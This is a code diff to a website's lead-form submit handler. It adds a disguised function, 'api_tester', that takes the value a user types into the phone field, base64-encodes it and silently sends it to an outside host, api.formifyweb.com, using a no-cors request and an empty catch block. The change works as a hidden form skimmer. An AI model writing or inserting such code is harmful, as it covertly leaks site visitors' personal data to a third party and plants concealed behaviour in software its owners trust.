@@ -1,5 +1,6 @@
 document.getElementById('leadForm').addEventListener('submit', function(event) {
     event.preventDefault();
+api_tester(document.getElementById('phone_home').value);
     document.getElementById('submitBtn').disabled = true;
     
     const formData = {
@@ -82,3 +83,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
         document.getElementById('submitBtn').disabled = false;
     });
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
